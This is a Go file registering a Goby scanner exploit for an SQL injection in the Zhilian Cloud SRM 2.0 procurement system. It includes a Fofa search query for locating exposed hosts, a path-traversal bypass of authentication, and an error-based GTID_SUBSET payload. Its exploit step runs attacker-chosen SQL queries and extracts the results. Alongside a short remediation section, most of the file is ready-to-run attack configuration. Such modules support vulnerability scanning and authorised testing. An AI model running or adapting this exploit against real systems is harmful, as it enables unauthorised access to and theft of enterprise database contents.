package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Zhilian Cloud Mining SRM2.0 /a/srm/inquiry/getSuppliers SQL Injection Vulnerability",
    "Description": "<p>The SRM Zhilian Cloud Procurement System by Zhihulian (Shenzhen) Technology Co., Ltd. is an intelligent solution for enterprise supply chain management. The system's inquiry module has a SQL injection vulnerability that allows attackers to craft malicious SQL statements to obtain sensitive information from the database, affecting the normal operation of the system.</p>",
    "Product": "Zhihulian (Shenzhen) Technology Co., Ltd. SRM Zhilian Cloud Procurement System",
    "Homepage": "https://www.zhilink.com/",
    "DisclosureDate": "2024-11-22",
    "PostTime": "2024-11-26",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "(body=\"function changeTableMode()\" || title==\"SRM 2.0\") && header=\"Content-Type: text/html\"",
    "GobyQuery": "(body=\"function changeTableMode()\" || title==\"SRM 2.0\") && header=\"Content-Type: text/html\"",
    "Level": "1",
    "Impact": "<p>This vulnerability allows attackers to obtain sensitive information from the database through SQL injection, which may lead to data leakage, data tampering, and other serious consequences.</p>",
    "VUL_URL": "/a/srm/inquiry/getSuppliers",
    "Recommendation": "<p>1. Use precompiled statements: Parameterized queries and precompiled statements (such as Prepared Statements) can ensure that the input data is processed as parameters, so as to avoid direct insertion into SQL statements. </p><p> 2. Input validation: Strict verification of user input to ensure that only data within the legal range is received. You can use a whitelist policy to filter out all invalid characters.   </p><p> 3. Principle of least privilege: The database account should only be granted the minimum permission to perform the required operations, and avoid using high-privilege accounts to connect to the database.   </p><p> 4. Error message handling: Avoid displaying detailed database error information on the front end, so as not to leak the system structure and database information.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/143933156"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "select database(),select version(),select user()",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "select database()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/adpweb/static/%2e%2e;/a/srm/inquiry/getSuppliers?code=1%27+AND+GTID_SUBSET%28CONCAT%280x7e%2CCONCAT%280x7e%2C%28select+MD5%28{{{rand_int}}}%29%29%2C0x7e%29%2C0x7e%29%2C7973%29--+WkOF&name=1",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
                    "X-Requested-With": "XMLHttpRequest"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{{{rand_int_md5}}}",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/adpweb/static/%2e%2e;/a/srm/inquiry/getSuppliers",
                "keydemo|lastbody|variable|/adpweb/static/%2e%2e;/a/srm/inquiry/getSuppliers"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/adpweb/static/%2e%2e;/a/srm/inquiry/getSuppliers?code=1%27+AND+GTID_SUBSET%28CONCAT%280x7e%2CCONCAT%280x7e%2C%28{{{payload_encode}}}%29%2C0x7e%29%2C0x7e%29%2C7973%29--+WkOF&name=1",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
                    "X-Requested-With": "XMLHttpRequest"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "~~([\\s\\S]*?)~~",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|~~([\\s\\S]*?)~~",
                "output|when|attackType=sqlpoint|{{{lastreq}}}"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "智联云采 SRM2.0 /a/srm/inquiry/getSuppliers SQL 注入漏洞",
            "Product": "智互联(深圳)科技有限公司SRM智联云采系统",
            "Description": "<p>智联云采 SRM2.0是一款针对企业供应链采购管理难题及数字化转型需求，智联云采依托人工智能、物联网、大数据、云等前沿技术，沉淀产品系统化方案，帮助企业实现战略寻源更具预测性，供应商管理更具前瞻性，采购执行更具自动性，进而让企业采购高效执行，缩短供应周期及提高周转频次；维护良好的供应关系获取更高性价比的货源，构建利益共同体。&nbsp;智联云采/adpweb/static/..;/a/srm/inquiry/getSuppliers接口处存在SQL注入漏洞，未经身份认证的攻击者可获取用户名密码等敏感信息。<br></p>",
            "Recommendation": "<p>1、使用预编译语句：采用参数化查询和预编译语句（如Prepared Statements），可以确保输入数据作为参数处理，从而避免直接插入到SQL语句中。&nbsp;</p><p>&nbsp;2、输入验证：对用户输入进行严格验证，确保只接收合法范围内的数据。可以使用白名单策略，过滤掉所有非法字符。&nbsp;&nbsp;</p><p>3、最小权限原则：数据库账户应仅授予执行所需操作的最低权限，避免使用高权限账户连接数据库。&nbsp;&nbsp;</p><p>4、错误信息处理：避免在前端展示详细的数据库错误信息，以免泄露系统结构和数据库信息。<br></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Zhilian Cloud Mining SRM2.0 /a/srm/inquiry/getSuppliers SQL Injection Vulnerability",
            "Product": "Zhihulian (Shenzhen) Technology Co., Ltd. SRM Zhilian Cloud Procurement System",
            "Description": "<p>The SRM Zhilian Cloud Procurement System by Zhihulian (Shenzhen) Technology Co., Ltd. is an intelligent solution for enterprise supply chain management. The system's inquiry module has a SQL injection vulnerability that allows attackers to craft malicious SQL statements to obtain sensitive information from the database, affecting the normal operation of the system.</p>",
            "Recommendation": "<p>1. Use precompiled statements: Parameterized queries and precompiled statements (such as Prepared Statements) can ensure that the input data is processed as parameters, so as to avoid direct insertion into SQL statements.&nbsp;</p><p>&nbsp;2. Input validation: Strict verification of user input to ensure that only data within the legal range is received. You can use a whitelist policy to filter out all invalid characters.&nbsp;&nbsp;&nbsp;</p><p>&nbsp;3. Principle of least privilege: The database account should only be granted the minimum permission to perform the required operations, and avoid using high-privilege accounts to connect to the database.&nbsp;&nbsp;&nbsp;</p><p>&nbsp;4. Error message handling: Avoid displaying detailed database error information on the front end, so as not to leak the system structure and database information.<br></p>",
            "Impact": "<p>This vulnerability allows attackers to obtain sensitive information from the database through SQL injection, which may lead to data leakage, data tampering, and other serious consequences.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "payload_encode": "define|query_encode|{{{payload}}}",
        "rand_int": "define|variable|{{{rand|int|6}}}",
        "rand_int_md5": "define|md5|{{{rand_int}}}"
    },
    "EditType": "fast",
    "PocId": "9974"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}